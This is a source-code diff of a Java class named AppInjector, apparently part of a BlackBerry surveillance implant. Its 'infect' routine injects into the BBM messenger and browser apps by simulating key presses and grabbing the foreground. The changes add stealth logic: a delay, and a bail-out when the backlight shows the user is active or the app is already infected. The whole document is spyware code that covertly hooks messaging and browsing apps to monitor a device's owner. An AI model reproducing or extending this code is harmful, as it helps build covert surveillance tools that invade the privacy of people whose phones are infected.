@@ -2,7 +2,9 @@ package blackberry.injection;
 
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.ApplicationManager;
-import net.rim.device.api.ui.Keypad;
+import net.rim.device.api.system.Backlight;
+import net.rim.device.api.ui.Screen;
+import net.rim.device.api.ui.UiApplication;
 import blackberry.agent.im.AppInjectorBBM;
 import blackberry.agent.url.AppInjectorBrowser;
 import blackberry.debug.Debug;
@@ -40,8 +42,6 @@ public class AppInjector {
         }
     }
 
-    int type = 0;
-
     public boolean callMenuByKey() {
         //#ifdef DEBUG
         debug.trace("callMenu");
@@ -59,7 +59,7 @@ public class AppInjector {
                 //#endif
 
                 if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
-                    delegate.callMenuByKey(type);
+                    delegate.callMenuByKey();
                 }
             }
         }
@@ -97,6 +97,15 @@ public class AppInjector {
         //#ifdef DEBUG
         debug.trace("infect");
         //#endif
+        
+        Utils.sleep(delegate.getDelay());
+        if(Backlight.isEnabled()  || isInfected()){
+            //#ifdef DEBUG
+            debug.trace("infected or backlight, bailing out");
+            //#endif
+            return;
+        }
+        
         int req = requestForeground();
         Utils.sleep(100);
         boolean fore = checkForeground();
@@ -111,9 +120,12 @@ public class AppInjector {
             Utils.sleep(100);
 
             if (req == 2 && checkForeground()) {
-                KeyInjector.pressKeyCode(Keypad.KEY_ESCAPE);
-                KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
-
+                //KeyInjector.pressKeyCode(Keypad.KEY_ESCAPE);
+                //KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
+            }
+            
+            if (req == 2 && checkForeground()) {
+               manager.requestForegroundForConsole();
             }
         }
     }
@@ -126,6 +138,10 @@ public class AppInjector {
                 int processId = manager.getProcessId(apps[i]);
 
                 if (foregroundPin == processId) {
+                    Screen screen = UiApplication.getUiApplication().getActiveScreen();
+                    //#ifdef DEBUG
+                    debug.trace("checkForeground, acrive screen: " + screen);
+                    //#endif
                     return true;
                 } else {
                     return false;
